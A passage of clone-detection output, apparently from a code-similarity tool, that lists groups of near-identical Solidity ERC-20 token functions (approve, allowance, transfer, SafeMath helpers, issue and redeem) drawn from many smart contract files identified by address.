            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);
        } else {
            return super.approve(_spender, _value);
        }
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="469" endline="475" pcid="4775">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);
        } else {
            return super.approve(_spender, _value);
        }
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="369" endline="375" pcid="4462">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);
        } else {
            return super.approve(_spender, _value);
        }
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="469" endline="475" pcid="8944">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);
        } else {
            return super.approve(_spender, _value);
        }
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="369" endline="375" pcid="3374">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);
        } else {
            return super.approve(_spender, _value);
        }
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="469" endline="475" pcid="2607">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);
        } else {
            return super.approve(_spender, _value);
        }
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="369" endline="375" pcid="7413">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);
        } else {
            return super.approve(_spender, _value);
        }
    }
</source>
</class>

<class classid="108" nclones="7" nlines="8" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="386" endline="392" pcid="760">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        if (deprecated) {
            return StandardToken(upgradedAddress).allowance(_owner, _spender);
        } else {
            return super.allowance(_owner, _spender);
        }
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="478" endline="484" pcid="4776">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        if (deprecated) {
            return StandardToken(upgradedAddress).allowance(_owner, _spender);
        } else {
            return super.allowance(_owner, _spender);
        }
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="378" endline="384" pcid="4463">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        if (deprecated) {
            return StandardToken(upgradedAddress).allowance(_owner, _spender);
        } else {
            return super.allowance(_owner, _spender);
        }
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="478" endline="484" pcid="8945">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        if (deprecated) {
            return StandardToken(upgradedAddress).allowance(_owner, _spender);
        } else {
            return super.allowance(_owner, _spender);
        }
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="378" endline="384" pcid="3375">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        if (deprecated) {
            return StandardToken(upgradedAddress).allowance(_owner, _spender);
        } else {
            return super.allowance(_owner, _spender);
        }
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="478" endline="484" pcid="2608">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        if (deprecated) {
            return StandardToken(upgradedAddress).allowance(_owner, _spender);
        } else {
            return super.allowance(_owner, _spender);
        }
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="378" endline="384" pcid="7414">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        if (deprecated) {
            return StandardToken(upgradedAddress).allowance(_owner, _spender);
        } else {
            return super.allowance(_owner, _spender);
        }
    }
</source>
</class>

<class classid="109" nclones="7" nlines="5" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="395" endline="399" pcid="761">
    function deprecate(address _upgradedAddress) public onlyOwner {
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        Deprecate(_upgradedAddress);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="487" endline="491" pcid="4777">
    function deprecate(address _upgradedAddress) public onlyOwner {
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        Deprecate(_upgradedAddress);
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="487" endline="491" pcid="2609">
    function deprecate(address _upgradedAddress) public onlyOwner {
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        Deprecate(_upgradedAddress);
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="387" endline="391" pcid="3376">
    function deprecate(address _upgradedAddress) public onlyOwner {
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        Deprecate(_upgradedAddress);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="487" endline="491" pcid="8946">
    function deprecate(address _upgradedAddress) public onlyOwner {
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        Deprecate(_upgradedAddress);
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="387" endline="391" pcid="4464">
    function deprecate(address _upgradedAddress) public onlyOwner {
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        Deprecate(_upgradedAddress);
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="387" endline="391" pcid="7415">
    function deprecate(address _upgradedAddress) public onlyOwner {
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        Deprecate(_upgradedAddress);
    }
</source>
</class>

<class classid="110" nclones="7" nlines="8" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="402" endline="408" pcid="762">
    function totalSupply() public constant returns (uint) {
        if (deprecated) {
            return StandardToken(upgradedAddress).totalSupply();
        } else {
            return _totalSupply;
        }
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="394" endline="400" pcid="7416">
    function totalSupply() public constant returns (uint) {
        if (deprecated) {
            return StandardToken(upgradedAddress).totalSupply();
        } else {
            return _totalSupply;
        }
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="494" endline="500" pcid="8947">
    function totalSupply() public constant returns (uint) {
        if (deprecated) {
            return StandardToken(upgradedAddress).totalSupply();
        } else {
            return _totalSupply;
        }
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="394" endline="400" pcid="4465">
    function totalSupply() public constant returns (uint) {
        if (deprecated) {
            return StandardToken(upgradedAddress).totalSupply();
        } else {
            return _totalSupply;
        }
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="494" endline="500" pcid="2610">
    function totalSupply() public constant returns (uint) {
        if (deprecated) {
            return StandardToken(upgradedAddress).totalSupply();
        } else {
            return _totalSupply;
        }
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="494" endline="500" pcid="4778">
    function totalSupply() public constant returns (uint) {
        if (deprecated) {
            return StandardToken(upgradedAddress).totalSupply();
        } else {
            return _totalSupply;
        }
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="394" endline="400" pcid="3377">
    function totalSupply() public constant returns (uint) {
        if (deprecated) {
            return StandardToken(upgradedAddress).totalSupply();
        } else {
            return _totalSupply;
        }
    }
</source>
</class>

<class classid="111" nclones="4" nlines="7" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="414" endline="421" pcid="763">
    function issue(uint amount) public onlyOwner {
        require(_totalSupply + amount > _totalSupply);
        require(balances[owner] + amount > balances[owner]);

        balances[owner] += amount;
        _totalSupply += amount;
        Issue(amount);
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="406" endline="413" pcid="7417">
    function issue(uint amount) public onlyOwner {
        require(_totalSupply + amount > _totalSupply);
        require(balances[owner] + amount > balances[owner]);

        balances[owner] += amount;
        _totalSupply += amount;
        Issue(amount);
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="406" endline="413" pcid="3378">
    function issue(uint amount) public onlyOwner {
        require(_totalSupply + amount > _totalSupply);
        require(balances[owner] + amount > balances[owner]);

        balances[owner] += amount;
        _totalSupply += amount;
        Issue(amount);
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="406" endline="413" pcid="4466">
    function issue(uint amount) public onlyOwner {
        require(_totalSupply + amount > _totalSupply);
        require(balances[owner] + amount > balances[owner]);

        balances[owner] += amount;
        _totalSupply += amount;
        Issue(amount);
    }
</source>
</class>

<class classid="112" nclones="7" nlines="7" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="428" endline="435" pcid="764">
    function redeem(uint amount) public onlyOwner {
        require(_totalSupply >= amount);
        require(balances[owner] >= amount);

        _totalSupply -= amount;
        balances[owner] -= amount;
        Redeem(amount);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="575" endline="582" pcid="4784">
    function redeem(uint amount) public onlyOwner {
        require(_totalSupply >= amount);
        require(balances[owner] >= amount);

        _totalSupply -= amount;
        balances[owner] -= amount;
        Redeem(amount);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="575" endline="582" pcid="8953">
    function redeem(uint amount) public onlyOwner {
        require(_totalSupply >= amount);
        require(balances[owner] >= amount);

        _totalSupply -= amount;
        balances[owner] -= amount;
        Redeem(amount);
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="420" endline="427" pcid="3379">
    function redeem(uint amount) public onlyOwner {
        require(_totalSupply >= amount);
        require(balances[owner] >= amount);

        _totalSupply -= amount;
        balances[owner] -= amount;
        Redeem(amount);
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="575" endline="582" pcid="2616">
    function redeem(uint amount) public onlyOwner {
        require(_totalSupply >= amount);
        require(balances[owner] >= amount);

        _totalSupply -= amount;
        balances[owner] -= amount;
        Redeem(amount);
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="420" endline="427" pcid="4467">
    function redeem(uint amount) public onlyOwner {
        require(_totalSupply >= amount);
        require(balances[owner] >= amount);

        _totalSupply -= amount;
        balances[owner] -= amount;
        Redeem(amount);
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="420" endline="427" pcid="7418">
    function redeem(uint amount) public onlyOwner {
        require(_totalSupply >= amount);
        require(balances[owner] >= amount);

        _totalSupply -= amount;
        balances[owner] -= amount;
        Redeem(amount);
    }
</source>
</class>

<class classid="113" nclones="7" nlines="7" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="437" endline="446" pcid="765">
    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {
        // Ensure transparency by hardcoding limit beyond which fees can never be added
        require(newBasisPoints < 20);
        require(newMaxFee < 50);

        basisPointsRate = newBasisPoints;
        maximumFee = newMaxFee.mul(10**decimals);

        Params(basisPointsRate, maximumFee);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="584" endline="593" pcid="8954">
    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {
        // Ensure transparency by hardcoding limit beyond which fees can never be added
        require(newBasisPoints < 20);
        require(newMaxFee < 50);

        basisPointsRate = newBasisPoints;
        maximumFee = newMaxFee.mul(10**decimals);

        Params(basisPointsRate, maximumFee);
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="429" endline="438" pcid="7419">
    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {
        // Ensure transparency by hardcoding limit beyond which fees can never be added
        require(newBasisPoints < 20);
        require(newMaxFee < 50);

        basisPointsRate = newBasisPoints;
        maximumFee = newMaxFee.mul(10**decimals);

        Params(basisPointsRate, maximumFee);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="584" endline="593" pcid="4785">
    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {
        // Ensure transparency by hardcoding limit beyond which fees can never be added
        require(newBasisPoints < 20);
        require(newMaxFee < 50);

        basisPointsRate = newBasisPoints;
        maximumFee = newMaxFee.mul(10**decimals);

        Params(basisPointsRate, maximumFee);
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="429" endline="438" pcid="4468">
    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {
        // Ensure transparency by hardcoding limit beyond which fees can never be added
        require(newBasisPoints < 20);
        require(newMaxFee < 50);

        basisPointsRate = newBasisPoints;
        maximumFee = newMaxFee.mul(10**decimals);

        Params(basisPointsRate, maximumFee);
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="429" endline="438" pcid="3380">
    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {
        // Ensure transparency by hardcoding limit beyond which fees can never be added
        require(newBasisPoints < 20);
        require(newMaxFee < 50);

        basisPointsRate = newBasisPoints;
        maximumFee = newMaxFee.mul(10**decimals);

        Params(basisPointsRate, maximumFee);
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="584" endline="593" pcid="2617">
    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {
        // Ensure transparency by hardcoding limit beyond which fees can never be added
        require(newBasisPoints < 20);
        require(newMaxFee < 50);

        basisPointsRate = newBasisPoints;
        maximumFee = newMaxFee.mul(10**decimals);

        Params(basisPointsRate, maximumFee);
    }
</source>
</class>

<class classid="114" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x1ac50ddad5d190bd8403d70b5127749ea6ece230.sol" startline="23" endline="26" pcid="842">
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
</source>
<source file="systems/source-code/0xc630c6bff4d198f30d9ab86f89fb83f0bc3fb948.sol" startline="21" endline="24" pcid="7128">
     function add(uint a, uint b) internal pure returns (uint c) {
         c = a + b;
         require(c >= a);
     }
</source>
</class>

<class classid="115" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x1ac50ddad5d190bd8403d70b5127749ea6ece230.sol" startline="27" endline="28" pcid="843">
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
</source>
<source file="systems/source-code/0xc630c6bff4d198f30d9ab86f89fb83f0bc3fb948.sol" startline="25" endline="28" pcid="7129">
     function sub(uint a, uint b) internal pure returns (uint c) {
         require(b <= a);
         c = a - b;
     }
</source>
</class>

<class classid="116" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x1ac50ddad5d190bd8403d70b5127749ea6ece230.sol" startline="28" endline="28" pcid="844">
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
</source>
<source file="systems/source-code/0xc630c6bff4d198f30d9ab86f89fb83f0bc3fb948.sol" startline="29" endline="32" pcid="7130">
     function mul(uint a, uint b) internal pure returns (uint c) {
         c = a * b;
         require(a == 0 || c / a == b);
     }
</source>
</class>

<class classid="117" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x1ac50ddad5d190bd8403d70b5127749ea6ece230.sol" startline="28" endline="30" pcid="845">
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
</source>
<source file="systems/source-code/0xc630c6bff4d198f30d9ab86f89fb83f0bc3fb948.sol" startline="33" endline="36" pcid="7131">
     function div(uint a, uint b) internal pure returns (uint c) {
         require(b > 0);
         c = a / b;
     }
</source>
</class>

<class classid="118" nclones="6" nlines="5" similarity="75">
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="22" endline="26" pcid="904">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="49" endline="54" pcid="5226">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="121" endline="126" pcid="7869">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }
</source>
<source file="systems/source-code/0xeb6f0cfce80e88872c441d618e3c77c184892690.sol" startline="41" endline="46" pcid="8561">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    uint256 c = a - b;

    return c;
  }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="121" endline="126" pcid="1973">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="148" endline="153" pcid="8629">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }
</source>
</class>

<class classid="119" nclones="9" nlines="6" similarity="80">
<source file="systems/source-code/0x1E7614EcC9bEeA7B9eE389C71A4D0b3CDc54cd21.sol" startline="19" endline="25" pcid="949">
    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "Solde insuffisant");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
</source>
<source file="systems/source-code/0xb6f2920e2e7d1892ddd0ed3c073c204ab90461d1.sol" startline="56" endline="61" pcid="6662">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x24982c94a024e5fb32eba94eda02404a89dadaef.sol" startline="56" endline="61" pcid="1123">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x307121b525b8d83a37bf77c2c71c2a9e75ea7141.sol" startline="56" endline="61" pcid="1501">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x95b34d9c10e8569d9fd1e08001cfd84a59226ab9.sol" startline="56" endline="61" pcid="5460">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x39Fd4791fC181B9889397101E644460705aA11d0.sol" startline="43" endline="48" pcid="1941">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x587c98e29d4b92f58fa763a7c3b08613fc5ec66b.sol" startline="56" endline="61" pcid="3336">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x56cf70eb52d13938b15a850ea6400113478c1015.sol" startline="56" endline="61" pcid="3265">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5d3feb9feedf8e6bbf8dd1b8c3be081b11cb687f.sol" startline="35" endline="39" pcid="3539">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        t[msg.sender] -= amount;
        t[recipient] += amount;
        return true;
    }
</source>
</class>

<class classid="120" nclones="12" nlines="3" similarity="100">
<source file="systems/source-code/0x23e0b74aE3EC9f9B37AE2b13024Cc089e777E865.sol" startline="53" endline="55" pcid="1074">
    function balanceOf(address addr) public view override returns (uint256) {
        return balances[addr];
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="74" endline="76" pcid="9003">
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="401" endline="403" pcid="9256">
  function balanceOf(address account) external override view returns (uint256) {
    return _balances[account];
  }
</source>
<source file="systems/source-code/0x523747c5bed9b50161c801b4a4b7a7799a1add3c.sol" startline="57" endline="59" pcid="3039">
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x512Fe2B277Bd0EB9763a329f1025dc6cBcBf225B.sol" startline="42" endline="44" pcid="3015">
    function balanceOf(address tokenOwner) public override view returns (uint256) {
        return balances[tokenOwner];
    }
</source>
<source file="systems/source-code/0x75ead649fc217b1a630aee17278b1f2045b6b276.sol" startline="37" endline="39" pcid="4372">
    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc096251a6bb2e6c2015307be53fe60b01a4a7c3e.sol" startline="51" endline="53" pcid="6880">
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="45" endline="47" pcid="8056">
  function balanceOf(address addr) public view override returns (uint256) {
    return balances[addr];
  }
</source>
<source file="systems/source-code/0x5f60596411116de6c38ac8d68c159700cf72db3f.sol" startline="34" endline="36" pcid="3606">
    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x57ff7796c8fc9ea293a1e63e405066342f87454d.sol" startline="35" endline="37" pcid="3297">
    function balanceOf(address tokenOwner) public override view returns (uint256) {
        return balances[tokenOwner];
    }
</source>
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="74" endline="76" pcid="8959">
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="44" endline="46" pcid="8971">
  function balanceOf(address addr) public view override returns (uint256) {
    return balances[addr];
  }
</source>
</class>

<class classid="121" nclones="12" nlines="3" similarity="100">
<source file="systems/source-code/0x23e0b74aE3EC9f9B37AE2b13024Cc089e777E865.sol" startline="57" endline="59" pcid="1075">
    function allowance(address addr, address spender) public view override returns (uint256) {
        return allowed[addr][spender];
    }
</source>
<source file="systems/source-code/0x75ead649fc217b1a630aee17278b1f2045b6b276.sol" startline="46" endline="48" pcid="4374">
    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc096251a6bb2e6c2015307be53fe60b01a4a7c3e.sol" startline="60" endline="62" pcid="6882">
    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="83" endline="85" pcid="9005">
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="421" endline="423" pcid="9258">
  function allowance(address owner, address spender) external override view returns (uint256) {
    return _allowances[owner][spender];
  }
</source>
<source file="systems/source-code/0x523747c5bed9b50161c801b4a4b7a7799a1add3c.sol" startline="66" endline="68" pcid="3041">
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x512Fe2B277Bd0EB9763a329f1025dc6cBcBf225B.sol" startline="60" endline="62" pcid="3018">
    function allowance(address owner, address delegate) public override view returns (uint) {
        return allowed[owner][delegate];
    }
</source>
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="49" endline="51" pcid="8057">
  function allowance(address addr, address spender) public view override returns (uint256) {
    return allowed[addr][spender];
  }
</source>
<source file="systems/source-code/0x5f60596411116de6c38ac8d68c159700cf72db3f.sol" startline="43" endline="45" pcid="3608">
    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="48" endline="50" pcid="8972">
  function allowance(address addr, address spender) public view override returns (uint256) {
    return allowed[addr][spender];
  }
</source>
<source file="systems/source-code/0x57ff7796c8fc9ea293a1e63e405066342f87454d.sol" startline="56" endline="58" pcid="3300">
    function allowance(address owner, address delegate) public override view returns (uint) {
        return allowed[owner][delegate];
    }
</source>
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="83" endline="85" pcid="8961">
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
</class>

<class classid="122" nclones="3" nlines="6" similarity="100">
<source file="systems/source-code/0x23e0b74aE3EC9f9B37AE2b13024Cc089e777E865.sol" startline="110" endline="115" pcid="1078">
    function approve(address spender, uint256 value) public override returns (bool) {
        require(spender != address(0));
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="69" endline="74" pcid="8975">
  function approve(address spender, uint256 value) public override returns (bool) {
    require(spender != address(0));
    allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }
</source>
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="70" endline="75" pcid="8060">
  function approve(address spender, uint256 value) public override returns (bool) {
    require(spender != address(0));
    allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }
</source>
</class>

<class classid="123" nclones="10" nlines="6" similarity="80">
<source file="systems/source-code/0x23e0b74aE3EC9f9B37AE2b13024Cc089e777E865.sol" startline="117" endline="122" pcid="1079">
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowed[msg.sender][spender] = allowed[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
        return true;
    }
</source>
<source file="systems/source-code/0x23e0b74aE3EC9f9B37AE2b13024Cc089e777E865.sol" startline="124" endline="129" pcid="1080">
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowed[msg.sender][spender] = allowed[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
        return true;
    }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="97" endline="102" pcid="8978">
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    allowed[msg.sender][spender] = allowed[msg.sender][spender].sub(subtractedValue);
    emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
    return true;
  }
</source>
<source file="systems/source-code/0xc601f3c40a8DE1f872AE056e7e21E255E740741A.sol" startline="100" endline="105" pcid="7120">
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    allowed[msg.sender][spender] = allowed[msg.sender][spender].add(addedValue);
    emit Approval(msg.sender, spender, allowed[msg.sender][spender]);
    return true;
  }
</source>
<source file="systems/source-code/0xc601f3c40a8DE1f872AE056e7e21E255E740741A.sol" startline="107" endline="112" pcid="7121">
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
